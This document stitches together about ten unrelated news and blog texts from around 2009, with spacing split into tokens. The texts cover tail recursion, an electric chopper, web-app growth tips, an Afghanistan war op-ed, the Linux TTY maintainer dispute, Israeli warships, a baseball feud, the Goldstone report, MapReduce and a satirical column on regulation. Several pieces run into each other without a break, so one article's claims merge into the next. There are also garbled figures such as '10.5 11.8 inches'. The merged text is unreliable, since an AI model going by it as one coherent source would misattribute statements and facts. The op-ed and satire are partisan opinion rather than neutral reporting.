I ’ve always been irritated by the explanations , in the Erlang and Lisp introductory books , about how you must be careful to ensure that your recursive calls are the last thing executed , and I ’ve observed this leading sometimes to some gnarly unintuitive if / else branch placement .
Call me old - fashioned , but it just seems wrong when the semantics of two identical function invocations vary wildly as a function of whether there ’s an executable statement between the invocation and the function exit .
Orange County Choppers , known for building machines as brutish as they are loud , has produced this paradoxical bike touted as the “ first custom electric American chopper . ”
The showpiece exhibits the trademark OCC outrageous ode to flair and themed design , but this time you wo n't hear it coming from a mile away .
On Wednesday , Siemens , the electronics and electrical engineering global powerhouse , unveiled the Smart Chopper it commissioned from the renowned custom motorcycle outfit .
Siemens claims the bike has a 60 - mile range and a 100 mph top speed .
An onboard charging unit can be plugged into any 110 - volt socket to charge the bike in five hours , and Siemens says it 'll charge in as little as one hour when plugged into a higher - voltage station .
A single - speed , clutch - less transmission delivers the power from a 27 - hp electric motor .
The Smart Chopper joins the growing ranks of electric motorcycles , including the Brammo Enertia , Zero X and the Mission One .
Steve Conner , CFO of Siemens ' Energy Service Division , sees the venture as a way to showcase the company 's innovative and environmental awareness along with the current state of technology .
“ We already have what we need to make it a reality , ” Connor told Wired.com .
“ This is n’t Star Wars . ”
Do n't worry about the bike lacking that distinctive OCC look and feel .
The 350 - pound bike is long and low , with an massive 300 mm ( 10.5 11.8 inches ) rear tire .
With an outrageous 120 - inch wheelbase and overall 45 - degree raked front end , you 'll need four lanes to make a U - turn .
Sounds like an OCC bike to us .
Of course , the entire bike is outfitted with LED lighting by OSRAM Sylvania , a Siemens subsidiary .
Along with the lighting supplies , Siemens has also provided the electric motor , charging system , power management system and wind turbine blade fiberglass for the Teutuls to integrate into their design , in keeping with the family 's knack for tying form with function and theme .
As a cradle - to - grave electrical technology company , Siemens ’ products generate 33 percent of all power consumed in the United States and 25 percent worldwide , including wind , solar , hydro and clean coal - generated power .
With its Smart Grid technologies providing the efficient delivery of power over long distances once considered impossible , Siemens has pledged to reduce its own CO2 , water and waste footprint by 20 percent within five years .
Over the next year , the Smart Chopper will make a countrywide tour to promote sustainable and green technology .
But if you want the Smart Chopper 's last tour stop to be your home garage , get your checkbook ready and cross your fingers that Jay Leno does n’t show .
This chopper hits the auction block in 2010 with all proceeds going to a yet to be determined charity .

At the Future of Web Apps conference Kevin Rose ( Digg , Pownce , Wefollow ) gave a cool presentation on the top 10 down and dirty ways you can grow your web app .
He took the questions he 's most often asked and turned it into a very informative talk .
This is n't the typical kind of scalability we cover on this site .
There are n't any infrastructure and operations tips .
But the reason we care about scalability is to support users and Kevin has a lot of good techniques to help your user base bloom .
Here 's a summary of the 10 ways to grow your consumer web application :
1. Ego .
Ask does this feature increase the users self - worth or stroke the ego ?
What emotional and visible awards will a user receive for contributing to your site ?
Are they gaining reputation , badges , show case what they 've done in the community ?
Sites that have done it well :
Twitter.com followers .
Followers turns every single celebrity as spokesperson for your service .
Celebrities continually pimp your service in the hopes of getting more followers .
It 's an amazing self - reinforcing traffic generator .
Why do followers work ?
Twitter communication is one way .
It 's simple .
Followers do n't have to be approved and there are n't complicated permission schemes about who can see what .
It means something for people to increase their follower account .
It becomes a contest to see who can have more .
So even spam followers are valuable to users as it helps them win the game .
Digg.com leader boards .
Leader Boards show the score for a user activity .
In digg it was based on the number of articles submitted .
Encourage people to have a competition and do work inside the digg ecosystem .
Everyone wants to see their name in lights .
Digg.com highlight users .
Users who submitted stories where rewarded by having their name in a larger font and a friending icon put beside their story submission .
Users liked this .
2. Simplicity .
Simplicity is the key .
A lot of people overbuild features .
Do n't over build features .
Release something and see what users are going to do .
Pick 2 - 3 on your site and do them extremely well .
Focus on those 2 - 3 things .
Always ask if there 's anything you take out from a feature .
Make it lighter and cleaner and easy to understand and use .
3. Build and Release .
Stop thinking you understand your users .
You think users will love this or that and you 'll probably be wrong .
So do n't spend 6 months building features users may not love or will only use 20 % of .
Learn from what users actually do on your site .
Avoid analysis paralysis , especially as you get larger .
Decide , build , release , get feedback , iterate .
4. Hack the Press .
There are techniques you can use that will get you more publicity .
Invite only system .
Get press by creating an invite only system .
Have a limited number of invites and seed them with bloggers .
Get the buzz going .
Give each user a limited number of invites ( 4 or 5 ) .
It gets bloggers talking about your service .
The main stream press calls and you say you are not ready .
This amps the hype cycle .
Make new features login - only , accessible only if you log in but make them visible and marked beta on the site .
This increases the number of registered users .
Talk to junior bloggers .
On Tech Crunch , for example , find the most junior blogger and pitch them .
It 's more likely you 'll get covered .
Attend parties for events you can't afford .
You can go to the after parties for events you can't afford .
Figure out who you want to talk to .
Follow their twitter accounts and see where they are going .
Have a demo in - hand .
People wo n't understand your great vision without a demo .
Bring an iPhone or laptop to show case the demo .
Keep the demo short , 30 - 60 seconds .
Say :
Hey , I just need 30 seconds of your time , it 's really cool , and here 's why I think you 'll like it .
Slant it towards what they do or why they cover .
5. Connect with your community .
Start a podcast .
A big driver in the early days of Digg .
Influencers will listen and they are the heart of your ecosystem .
Throw a launch party and yearly and quarterly events .
Personally invite influencers and their friends .
Just have a party at a bar .
Throw them around conferences as people are already there .
Engage and interact with your community .
Do n't visually punish users .
Often users do n't understand bad behaviour yet as they think they are just playing they game your system sets up .
Walk through the positive behaviours you want to reinforce on the site .
6. Advisors .
Have a strong group of advisors .
Think about which technical , marketing and other problems you 'll have and seek out people to help you .
Give them stock compensation .
A strong advisory team helps with VCs .
7. Leverage your user base to spread the world .
FarmVille .
tells users when other players have helped them and asks the player to repay the favor .
This gets players back into the system by using a social obligation hack .
They also require having a certain number of friends before you expand your farm .
They give away rare prizes .
Wefollow .
Tweets hashtags when people follow someone else .
This further publicizes the system .
They also ask when a new user hits the system if they wanted to be added to the directory , telling the user that X hundred thousand of your closest friends have already added themselves .
This is the number one way they get new users .
8. Provide value for third party sites .
Wallstreet Journal , for example , puts FriendFeed , Twitter , etc links on every page because they think it adds value to their site .
Is there some way you can provide value like that ?
9 . Analyze your traffic .
Install Google analytics ,
See where people are entering from .
Where they are going .
Where they are exiting from and how you can improve those pages .
10 . The entire picture .
Step back and look at the entire picture .
Look at users who are creating quality content .
Quality content drives more traffic to your site .
Traffic going out of your site encourages other sites to add buttons to your site which encourages more users and more traffic into your site .
It 's a circle of life .
Look at how your whole eco system is doing .

The War in Afghanistan will soon have been going on for 8 years with absolutely no end in sight .
Are we losing ?
Maybe , maybe not .
But , it is clear that we are not winning .
A “ surge ” like President Bush ’s successful strategy for turning around the Iraq War is unlikely to work in Afghanistan .
This War has cost hundreds of billions of dollars in Treasure and , more importantly , hundreds of honorable American lives .
I supported this War for a long time–pretty much everyone did at some point .
In November 2001 , shortly after the War started , only 9 % of Americans thought the War was a mistake .
But , changing situations create the need for changes in outlook , and often changes in policy .
Whether or not the War was a mistake , a majority of Americans now want our troops to leave Afghanistan .
We have not succeeded in dismantling al - Qaeda .
We have not captured Osama bin-Laden or many of the other high value targets .
The Soviet Empire ’s premature end was due in part to its war in Afghanistan .
We should not allow history to repeat itself and bring an end to the mighty American Empire as well .
This Nation is hemmorhaging money , the economy is dismal .
It is time to stop spending so much of our National fortune on this War .
Our cost for this War will be paid back over the next 3o years to China and others who have loaned us the money to fight .
Afghanistan ’s government is crumbling and it now appears that Hamid Karzai , Afghanistan ’s American backed Prime Minister may have engaged in ballot - stuffing and other measures of voter fraud to keep himself in power .
These actions are preciously the same that American officials have criticized Iran for taking .
By standing behind a government like this , we are implicitly voicing our approval of these actions .
This war has spilled over into Pakistan and has greatly destabilized a nation with nuclear weapons –threatening the security of the entire world in the process .
The anti-war left has recently been strangely silent over the wars in Afghanistan and Iraq .
My assumption is that they have not wanted to create political problems for a President that they largely supported while he is trying to push through health care and environmental legislation also largely supported by this group .
With the health care and cap and trade bills headed for near - certain failure or at a least a major watering down , I suspect that the anti-war left will begin to be more vocal in its opposition to the War in Afghanistan again soon .
New polls show that the majority of Americans now oppose the War in Afghanistan .
President Obama ’s approval ratings have now dropped to the mid-40 - low 50 ’s range .
You can be certain that President Obama does not intend to sacrifice his popularity over a war that was started on President Bush ’s watch .
In the coming months , President Obama soon announce his decisions on what to do about the War in Afghanistan .
Many policy analysts believe that the President will announce a large increase in the number of troops for Afghanistan .
This is exactly the wrong strategy .
President Obama should begin a massive withdrawal of American troops from Afghanistan .
Im not saying that we shouldnt continue to hunt bin-Laden–I would favor leaving behind an extremely small and elite force to hunt terrorists and bring them to justice .
However , we should stop engaging in “ nation building , ” stop propping up Karzai ’s corrput government , and stop fighting this War .
If other Nations wish to continue fighting this War without our aid , let them do so , but the United States government should cease spending the lives and the wealth of Americans on this War .
We can still leave Afghanistan honorably ; it is time to do the right thing and bring our brave and heroic men and women home from Afghanistan .

There are dark areas of the kernel where only the bravest hackers dare to tread .
Places where the code is twisted , the requirements are complex , and everything depends on ancient code which has seen little change over the years because even the most qualified developers fear the consequences .
Arguably , no part of the kernel is darker and scarier than the serial terminal ( TTY ) code .
Recently , this code was getting a much - needed update , but it now appears that a disconnect within the community has brought that work to a halt and thrown TTY back into the " unmaintained " column - at a time when that code has known regressions in the 2.6.31 - rc kernel .
At a first glance , the TTY layer would n't seem like it should be all that challenging .
It is , after all , just a simple char device which is charged with transferring byte - oriented data streams between two well - defined points .
But the problem is harder than it looks .
Much of the TTY code has roots in ancient hardware implementing the RS - 232 standard - one of the loosest , most variable standards out there .
TTY drivers also have to monitor the data stream and extract information from it ; this duty can include ^S / ^Q flow control , parity checking , and detection of control characters .
Control characters may turn into out - of - band information which must be communicated to user space ; ^D may become an end - of - file when the application reads to the appropriate point in the data stream , while other characters map onto signals .
So the TTY code has to deal with complex signal delivery as well - never a path to a simple code base .
Echoing of data - possibly transforming it in the process - must be handled .
With the addition of pseudo terminals ( PTYs ) , the TTY code has also become a sort of interprocess communication mechanism , with all of the weird TTY semantics preserved .
The TTY code also needs to support networking protocols like PPP without creating performance bottlenecks .
All told , it 's a complicated problem .
It is also a problem which seems to interest relatively few developers .
The top of drivers / char / tty_io .c still reads " Copyright ( C ) 1991 , 1992 , Linus Torvalds . "
Much of the code is still dependent on the big kernel lock .
There are deadlocks and race conditions to be found .
Almost nobody wants to touch it , but it still mostly works .
-- Alan , you are a true wizard :-)
The tty layer is one of the very few pieces of kernel code that scares the hell out of me :-)--
Ingo Molnar , July , 2007
In recent times , though , an energetic TTY maintainer has stepped forward : Alan Cox .
One could almost hear the sighs of relief across the net when this happened ; if anybody could clean out that particular set of Augean Stables , it would certainly be Alan , who has the combination of technical skill and attention to detail needed to avoid breaking things .
Over the last year , it has been clear that fixing the TTY code has stressed even Alan 's skills ; the work has been slow and apparently laborious .
But it has also been successful at getting the TTY code into better shape while preserving it as a functioning subsystem .
At least , that was the case until 2.6.31 , where the combination of significant changes and some last - minute tweaks led to regressions .
Users started to report that the kdesu application stopped working .
The emacs compile mode started losing output .
And so on .
It turns out that there were a few separate bugs , not all of which were in the tty layer :
The problem with kdesu appears to be a KDE bug ; the application would read too much data , then wonder why the next read did n't have what it wanted .
This code worked with the older TTY code , but broke with 2.6.31 .
There is probably no way to fix it which does n't saddle the kernel with maintaining weird legacy bug - compatibility code - something the TTY layer does not need more of .
The emacs problem is different .
In this case , the compile process would finish its work ( writing its final output to the PTY ) and exit .
Emacs would try to read that final output , but would get a failed read resulting from the SIGCHLD signal sent by the exiting compile process .
That failure was unexpected and caused emacs to drop the data .
In essence , emacs expected that , by the time the compile process had completed its close ( ) of the PTY file descriptor , the data written to that descriptor had been pushed through to the other end and would be available for reading .
The 2.6.31 changes broke that assumption .
The second problem results from the complex nature of TTY data processing .
It 's not just a serial stream of data ; instead , there is the line discipline processing in the middle .
In 2.6.31 , data written to a PTY will have been queued up for line discipline attention by the time a close ( ) is allowed to complete , but there 's no assurance that the line discipline code will have actually run and passed the data through to the other end .
So the SIGCHLD signal can pass the data and arrive first .
Alan thinks this behavior is reasonable ; it complies with the applicable standards and can be implemented in a relatively straightforward way .
Making a close ( ) on a PTY block until the other end has received the data might make emacs work better , but it also risks deadlock if both sides write data and close their file descriptors at the same time .
Even so , Alan posted a " elegant in all the wrong ways " patch which fixed the problem , but also made it clear that he thought emacs was buggy and that the real fix belonged there .
Linus merged a version of this patch , but he was not happy about it .
He believes that emacs is correct in its assumptions , and would like to see a better fix which makes the ordering of events clear and deterministic .
He made his frustration clear :
Why ?
Why blame emacs ?
Why call user land buggy , when the bug was introduced by you , and was in the kernel ?
Why are you fighting it ?
Why did it take so long to admit that all the regressions were kernel problems ?
Why were you trying to dismiss the regression report as a user - land bug from the very beginning ?
At that point , it was Alan 's turn to express frustration ; he did not hold back :
I 've been working on fixing it .
I have spent a huge amount of time working on the tty stuff trying to gradually get it sane without breaking anything and fixing security holes along the way as they came up .
I spent the past two evenings working on the tty regressions .
However I 've had enough .
If you think that problem is easy to fix you fix it .
Have fun .
The message included a patch removing Alan as the maintainer of the TTY layer .
And that is where things stand , as of this writing .
The TTY code is unmaintained again , a promising rework has halted partway through , and the person most qualified to fix the problems has thrown up his hands and left the building ( though it should be noted that he is participating in the conversation on how the next maintainer , whoever that might be , can fix things ) .
Kernel development will go on , but development in this area will go rather more slowly ; the TTY layer has claimed another victim .
Israel would like the two warships , worth an estimated 400 - 500 million euros ( $ 600 - 750 million ) , free of charge , the German daily Hannoversche Allgemeine Zeitung said on Friday , citing government sources .
The ships might be supplied by Hamburg 's Blohm +
Voss shipyard who confirmed an Israeli enquiry to German media without divulging any further details on the potential deal .
The ships ' weapons would be supplied by the United States .
The two state of the art corvettes , which are hard to detect by radar , are said to be larger than Israel 's current flagship Hanit .
The Israeli navy wants to install a " Barak 8 " missile defence system on the two vessels along with sophisticated radar so as " to be prepared for potential wars " , according to the Israeli daily newspaper Ma'ariv .
The move would allow Israel to shift a part of its missile defense system to the sea , rendering it less vulnerable to potential rocket attacks .
Germany has previously helped equip the Israeli navy , delivering three submarines in the years 1999 - 2000 .
Two further submarines are currently under construction in Kiel , costing at least 500 million euros apiece .
Germany is to foot a third of that bill .

The New York Yankees have announced that Don Zimmer will be Joe Girardi ’s bench coach tonight against the Philadelphia Phillies .
This is obviously another attempt to get inside the head of Game 2 starter Pedro Martinez .
The Yankees already seem to be in the head of the guy after his emotional , why pick on me , interview with the media yesterday .
So it looks like the Yankees are hoping that Zimmer on the bench should push Pedro over the edge .
Could this be an attempt at another brawl and maybe a few suspensions ?
As you know this is a joke but would n’t it have made for some good TV having Don in the Yankees dugout ?
The pitcher and former coach are still going back and forth in the media , six years after the fact .
“ It was an ugly scene , ” Martinez said during Wednesday ’s pregame news conference .
“ Zim charged me and I think he ’s going to say something , but his reaction was totally the opposite , [ he ] was trying to punch my mouth and told me a couple of bad words about my mom .
I just had to react and defend myself .
It was something that we have to let go , kind of , and forget about it , because it was a disgrace for baseball .
Even though it was n’t my fault , I was involved in it , and it ’s one of the moments that I do n’t like to see .
I do n’t like to see it because I ’m not a violent man . ”
While the words were n’t that severe the elder Zimmer took it that way .
“ Pedro is full of crap , ” Zimmer told the St. Petersburg Times .
“ It ’s what , six years later ?
If Pedro wants to be a big man , I do n’t care what he says . ”
There is no doubt in my mind that if Zimmer was in the dugout tonight someone in the middle of the Yankee order would get some high Pedro heat , oops actually at this point in the game it would be a change up .
Regardless at least we ’ll still get some great TV out of this game tonight .
Will Pedro feed off the “ Who ’s Your Daddy ” chants or do the Yankees embarrass their son and even the series at one .
Here ’s the video you will probably see played more then any today .
Pressure is building for an Israeli commission of inquiry into the Gaza war
By Heather Sharp
BBC News , Jerusalem
Support is growing within Israel for the launch of an independent inquiry into alleged war crimes committed during its offensive in Gaza last winter .
Last week the UN Human Rights Council voted to back the controversial Goldstone report , which calls on Israel and Hamas to mount credible investigations within six months .
Deputy Prime Minister and Intelligence Minister Dan Meridor added his voice on Wednesday to calls by the attorney general , and what officials say is pressure from the justice and foreign ministries , to establish a commission of inquiry .
This does not mean such figures depart from the widespread view in Israel that the report was a flawed , biased , politically motivated attempt to discredit it - a " kangaroo court " , as Prime Minister Benjamin Netanyahu put it .
Rather , it should be seen as some members of the Israeli government now considering their next defensive steps , after the failure of an intensive diplomatic campaign to stop the HRC even voting on the Goldstone report .
UN condemns ' war crimes ' in Gaza Israel condemns UN 's Gaza report Full UN report on Gaza war International jurist Richard Goldstone 's report recommends that if Israel and Hamas do not conduct credible investigations of their own within six months , the issue should be referred to the UN Security Council , which has the power to open a war crimes prosecution at the International Criminal Court .
The Israeli military has opened about 100 investigations , of which about 20 are criminal , but Mr Goldstone and many human rights organisations have said it is insufficient for the military to investigate itself .
Even the US , Israel 's staunch ally , which is expected to veto in the Security Council any prosecution attempt , has urged Israel to mount an independent inquiry .
Public relations
Those in Israel backing an inquiry think , in the words of one senior government official , " we have nothing to hide , and nothing to fear from an open investigation " .
Another pressing concern , the official explained , is the principle of universal jurisdiction , under which courts around the world can arrest and try military and political leaders from other countries who are suspected of war crimes .
A key condition for such arrests is that there have been no credible independent proceedings in the suspect 's home country .
However , officials say the military and Defence Ministry are strongly opposed an inquiry , arguing that it would discredit the military 's own internal investigations .
It is an outrageous report that constitutes a crude blood libel - but it's a fact
Sever Plocker , journalist , Yediot Ahronot A cabinet meeting on Tuesday on the issue agreed only to form a panel to head off possible prosecutions , and to continue to wage the diplomatic and public relations battle against the Goldstone report .
The possibility of setting up an independent inquiry was not even discussed , officials said .
Previous post - war inquiries have had serious ramifications .
The Winograd committee was established to look into failures during the 2006 Israel - Lebanon war - albeit ones seen to have put Israeli troops , rather than Lebanese civilians , at risk .
It levelled heavy criticism at senior military and political figures and came close to forcing the resignation of Prime Minister Ehud Olmert .
The commission 's work did lead to the the resignations of Chief of Staff Dan Halutz and the Defence Minister Amir Peretz .
And after the 1982 Lebanon war , the Kahan Commission into massacres at Sabra and Shatila refugee camps recommended that Ariel Sharon be dismissed from the post of Defence Minister .
Mr Goldstone 's report has been massively criticised in Israel - although Israel refused to co-operate with the investigation and refused to grant visas so the team could visit rocket - hit towns such as Sderot .
Commentators and government spokespeople alike point out that the UN Human Rights Council that commissioned it and backed it is a reformed version of a body known historically for being strongly anti-Israel , and includes renowned human rights violators such as Saudi Arabia , Egypt and China .
Independent investigation
They complain that the report devotes detailed analysis to incidents in which Israel is accused of war crimes , but shows little evidence of in - depth investigation of Israel 's claims that Palestinian militants used schools , mosques , hospitals and ambulances for cover , although it does accuse Hamas of war crimes in firing rockets at civilian areas .
Israelis are angered , for example , that the report states that the UN team did not investigate Israeli claims that Hamas took over a wing of Gaza City 's largest hospital , and only looked into one case of allegations that weapons were stored in mosques .
Even the Director of the human rights group B'Tselem , which gathered many testimonies of alleged abuses in Gaza , has described it as " disagreeable " and criticised the " weak , hesitant way that the report mentions Hamas 's strategy of using civilians [ in combat ] " .
But there is recognition that the report is not going to go away .
" It is an outrageous report that constitutes a crude blood libel - but it's a fact , " wrote Sever Plocker of the daily newspaper Yediot Ahronot .
" Our diplomatic situation has not been this bad for years .
We can cry out : ' Injustice ! Hypocrisy ! Anti-Semitism !' from now until kingdom come , but that yelling is n't going to do any good .
The snowball is already rolling , and I doubt whether there is anyone who is capable of stopping it . "
Mr Goldstone himself told US rabbis this week that an independent investigation in Israel " would really be the end of the matter , as far as Israel is concerned " .
Israelis are now trying to work out whether he is right .

This is the first of a two - part blog post that presents a perspective on the recent trend to integrate MapReduce with Relational Databases especially Analytic Database Management Systems ( ADBMS ) .
The first part of this blog post provides an introduction to MapReduce , provides a short description of the history and why MapReduce was created , and describes the stated benefits of MapReduce .
The second part of this blog post provides a short description of why I believe that integration of MapReduce with relational databases is a significant mistake .
It concludes by providing some alternatives that would provide much better solutions to the problems that MapReduce is supposed to solve .
1. What is MapReduce
MapReduce is a programming model and an associated implementation for manipulating very large data sets .
It provides a framework in which a programmer can write two simple functions , a mapper and a reducer that perform the actual data manipulation .
Applications written using the MapReduce framework are automatically parallelized and suitable for execution on a large infrastructure of connected machines .
2 . A brief history of MapReduce
Jeffrey Dean and Sanjay Ghemawat of Google announced MapReduce to the world in December 2004 at OSDI ’ 04 , the Sixth Symposium on Operating System Design and Implementation in San Francisco , CA .
A copy of their original publication is available for download here .
Some associated slideware is available here .
MapReduce had been in use at Google for some time before this publication .
Today the MapReduce implementation has been ported to a variety of platforms and some relational database vendors have begun to offer MapReduce extensions to their databases .
It is those extensions that are the subject of this article .
You can find a good high level overview of MapReduce on Wikipedia here .
3 . A simple MapReduce example
The best way to understand MapReduce is to look at a simple example .
The example provided below is one that can be executed easily in SQL and has been chosen because it provides a good description of MapReduce and of how it relates to conventional SQL .
A user has a data set consisting of three hundred million rows of data that contain census information .
A row of data contains an individuals name , age , ethnicity , address ( including zip code ) , sex , individual income and so on .
The user would like to aggregate and sort this information to produce an output that lists the zip codes in the country and the associated average individual income .
Assuming a reasonably self - explanatory schema , one could express this in SQL as follows .
SELECT ZIPCODE , AVERAGE ( INCOME ) FROM CENSUSDATA GROUP BY ZIPCODE ;
The MapReduce solution to this problem would be something similar to the following pseudo - code :
MAP ( KEY , VALUE ) :
// KEY : NAME OF THE INPUT FILE , CENSUSDATA
// VALUE : THE INPUT DATA , 300 MILLION ROWS WORTH
FOR EACH INDIVIDUAL IN VALUE
EMIT ( ZIPCODE , INCOME ) ;
REDUCE ( KEY , ITERATOR ) :
// KEY : A ZIP CODE
// VALUES : A LIST OF INCOMES FOR THAT ZIP CODE
LOCAL COUNT = 0 , TOTAL = 0 ;
FOR EACH INCOME IN ITERATOR
COUNT = COUNT + 1
TOTAL = TOTAL + INCOME ;
EMIT ( ZIPCODE , TOTAL / COUNT ) ;
To understand what that MapReduce pseudo - code is doing , consider how this gets executed .
The MapReduce framework is provided with a representation of this pseudo - code ( in some language ) and an input file with three hundred million rows of data .
Also , for the purpose of this description , let us assume that there are one - hundred ( 100 ) nodes that will participate in the execution of the map - reduce program .
The picture below shows this process .
Each node in this will have a running MapperJob .
The framework ( in some manner ) will take the input file with three hundred million rows and carve it up into one hundred pieces .
In other words , each piece will contain about three million rows and each MapperJob will process three million rows of data .
The MapperJob will execute the pseudo - code function MAP and emit one row of data for each row of input data .
In effect , the MAP operation is semantically equivalent to the database “ projection ” .
The projection would be a ZIPCODE and an INCOME .
This would result in one hundred temporary files that were generated by each of the MapperJobs .
The framework now consolidates these one hundred files into a single file and then proceeds to sort it by the ZIPCODE .
The resulting file would contain the ZIPCODE and INCOME sorted by ZIPCODE .
The resulting file would have three hundred million rows .
Each node in this execution will have a running ReducerJob .
The framework ( in some manner ) will take the above intermediate file and redistribute the data to the ReducerJobs .
All data pertaining to a single ZIPCODE would be sent to the same ReducerJob .
One simple way to accomplish this would be to take the ZIPCODE and perform the following operation on it
locus = mod ( zipcode , totalnodes )
where TOTALNODES would be one hundred ( 100 ) in the above illustration .
Assuming that the nodes were numbered from zero ( 0 ) to ninety - nine ( 99 ) , the value computed for LOCUS above would indicate which node should receive the data pertaining to the ZIPCODE .
This operation can be performed on non-numeric data as well through the use of some deterministic hash function .
In case the ReduceJob was aggregating on a non-numeric datum , one could compute LOCUS as
locus = mod ( hash ( datum ) , totalnodes )
Each ReducerJob would therefore receive a chunk of data relating to a specific ZIPCODE and could proceed to compute the total income and the number of individuals and therefore the average income .
4 . So , what ’s new about this ?
The preceding description of MapReduce to illustrate the steps involved in executing a specific data analysis operation should lead you to ask , “ what ’s the big deal ” ?
Analytics companies like Netezza and Teradata had mechanisms to MPP ’ize the execution of queries such as the one above .
So , what ’s new about MapReduce and why did Google create this framework ?
Since MPP databases exist , that could parallelize these data manipulation operations , it seems inconceivable that Google created this framework .
But , this was n’t a case of the philosophy of NIH ( Not Invented Here ) .
4.1 Query Fault Tolerance
To meet the anticipated problems of scale , engineers at Google accurately determined that they needed parallel execution .
If they had attempted to perform the kinds of operations that they wanted to perform on serial programming infrastructure , performance would not be satisfactory .
This is largely because the speed of processors , disks and interconnects could not scale as fast as the size of input data and computation complexity .
Further , as part of the need to parallelize their infrastructure , Google chose to use inexpensive hardware ( COTS ) with inexpensive disk drives .
One should also therefore be cognisent of the failure trends in these kinds of systems and one telling paper ( from Google ) can be found here .
Another good description of MapReduce providing a description of failure rates can be found here .
Basically , while disk capacities were growing rapidly ( because of increases in data recording density ) , failure rates ( measured in failures per GB per year ) were remaining constant .
As a result , at “ Google Scale ” , it was unlikely that any reasonable sized database query would complete in less time than it would take to record a disk failure .
Conventional disk failure strategies like RAID5 are known be failure prone .
One cause of such failures is inherent in the failure rates and makes it highly likely that an unrecoverable read error will occur during the RAID5 raid - stripe reconstruction ( see description here ) .
The other has to do with the inherent nature of RAID5 where parity validation can cause data corruption ( during parity verification , the controller reads data and parity and ensures that parity matches data .
But , in the event that parity does not match data , many controllers will attempt to fix the problem .
This “ fixing ” may introduce silent data corruption ) .
For these reasons , engineers at Google took great pains to build in a Fault Tolerance mechanism into the MapReduce framework .
If a node failed for some reason , the job would be restarted on another node and the MapReduce program would complete successfully .
At the time when Google developed this framework , other relational database systems that could scale to these data volumes did not provide robust “ Fault Tolerance ” and Google ’s engineers correctly determined that query failures would be frequent .
You can read all about how MapReduce achieves this in section 3.3 of the MapReduce paper .
4.2
The ability to perform operations not possible in SQL
The claim has been made by many that MapReduce can be used to perform operations that cannot be performed in conventional SQL .
Three specific examples of this kind of operation are described below .
4.2.1 SESSIONIZATION in SQL / MR and SQL
The Aster Data presentations of SQL / MR make the claim that SQL / MR can be used to process queries that are not even expressible in SQL .
You can listen to the context around that statement and the associated presentation at the Aster Data web page here .
The comment that I highlight above is approximately four minutes into the presentation ( at about 03:44 to 04:15 of the 11:42 presentation ) .
You should listen to the entire context because , in fairness to Aster Data , they also make the case that SQL / MR makes queries easier to write and understand , and there is definitely merit to that claim .
Around four and a half minutes into the presentation ( Aster Data presentation on SQL / MR , 04:30 of the 11:42 presentation ) , a description is provided of the sessionizing problem in clickstream analysis .
The SQL / MR representation of this solution is
select userid , ts , pageid , sessionid
from sessionize (
on clicks
partition by userid
order by ts
timeout ( 60 )
) ;
And the claim is that this would be long and complicated in pure SQL .
For those of you who do n’t know what sessionization is , you should listen to the description of the problem on the presentation .
In a nut - shell , a system collects clickstream information including a userid , a timestamp , a pageid ( URL ) .
A session is considered to be a sequence of clicks that are separated by no more than a certain specified timeout ( here , 60 seconds ) .
This process emits a series of “ sessionized ” clickstreams .
The claim is made that this is a problem whose solution would be “ long and complicated ” in SQL and I dispute that claim .
( If you do n’t agree with me , then try and write this in SQL ; I will be talking more about this claim in the second part of this blog post ) .
4.2.2 SQL / MR and nPath
A second presentation by Aster Data provides a description of the nPath built in MapReduce construct .
You can listen to that presentation here .
SQL / MR ’s nPath is a basic construct that is used to construct an open graph based on relational data .
The example presented , also with clickstream data is to find a sequence of rows where a user performed four specified actions :
Visited a designated page ( home page )
Viewed an auction
Viewed the profile of the seller and finally
Placed a bid on the auction
Here again , the claim is made that SQL / MR ’s nPath allows a user to “ transcend SQL ’s limitations with respect to ordered data ” .
That claim is made about 40 seconds into the 12:48 presentation .
Oddly enough , the examples presented do not really appear to be things that cannot be done in SQL .
This kind of graph construction is something that is absolutely do’able in SQL and the SQL is n’t even that complicated .
4.2.3 Google ’s example of Distributed Grep
Google provides the example of a MapReduce implementation of grep in the original MapReduce paper .
The description below is from section 2.3 where you will also find examples such as “ Count of URL Access Frequency ” and “ Reverse Web Link Graph ” .
“ Distributed Grep :
The map function emits a line if it matches a supplied pattern .
The reduce function is an identity function that just copies the supplied intermediate data to the output . ”
This concludes the first part of this two part blog post .
How can Americans be expected to wrestle with the myriad dangers that confront them each day ?
Insalubrious cereal ?
Unregulated garage sales ?
Pools of death ?
Sometimes it 's too much to process .
You know what we desperately are crying out for ?
An army of crusading federal regulatory agents with unfettered power .
Who else has the fortitude and foresight to keep us all safe ?
Mercifully , as The Washington Post recently reported , many of President Barack Obama 's appointees " have been quietly exercising their power over the trappings of daily life … awakening a vast regulatory apparatus with authority over nearly every U.S. workplace , 15,000 consumer products , and most items found in kitchen pantries and medicine cabinets . "
If there 's anything Americans are hankering for in their everyday lives , it 's a vast regulatory apparatus .
Hey , it 's dangerous out there .
That 's why the new chairman of the Consumer Product Safety Commission recently unleashed 100 agency inspectors to investigate whether swimming pools in America were equipped with drain covers to prevent children from entrapment .
Nearly 0.9 children fall prey to this sadistic killer each year .
With the compassionate guidance of federal officials , we almost surely will see this number plunge to 0.8 children per year .
It should be noted that in each tragic year that passes , an estimated 300 children younger than 4 drown in swimming pools .
Why our government sits idly by as this watery assassin targets the most vulnerable among us is a mystery .
Do n't get me started on food .
Washington will not rest until every one of our children is forcing down some gravel - based Mueslix after morning calisthenics in the name of a glorious preventive care revolution .
I get it .
They 're fat .
This is why I am grateful that one courageous soul finally has stood up to the menacing influence of Big Cereal .
Yes , Food and Drug Administration Commissioner Margaret A. Hamburg has had enough of deceitful infiltration of Cheerios , demanding that General Mills cease and desist a marketing campaign that peddles the fallacious claim that the oat - based cereal can lower cholesterol .
Why stop with oats ?
Trix are not only for kids , you know .
Lucky Charms are nowhere close to being " magically " delicious .
What Lucky Charms does do is perpetuate the stereotype that the Irish are a bunch of oft - inebriated jerks — which everyone knows is only true about 70 percent of the time .
Is n't there a statute we can pass in Congress to end the hate ?
Then again , it 's not only those scheming Irish who are hawking their wares — unregulated — on concrete suburban driveways and inner-city thrift shops across this country .
The " Resale Round - up , " launched by the Consumer Product Safety Commission , finally limits the power of the merchants of death who recklessly barter secondhand toys to unsuspecting civilians at low prices .
Consider that Tonka truck — the one that you somehow outlasted — contraband .
If not , you could be fined thousands of dollars .
The only question now is :
How did any of us survive this long ?
Michael Livermore — executive director of the Institute for the Study of Regulation , at the New York University School of Law — points out that " in the Bush administration , the problem was that the political folks were hostile to the mission . "
It is no surprise that the Bush administration — a close second to Big Cereal in wickedness — was hostile to regulating the rhinestones on your kids ' denim jackets .
Apparently , the depths of its depravity knew no bounds .
The mission ?
Simple .
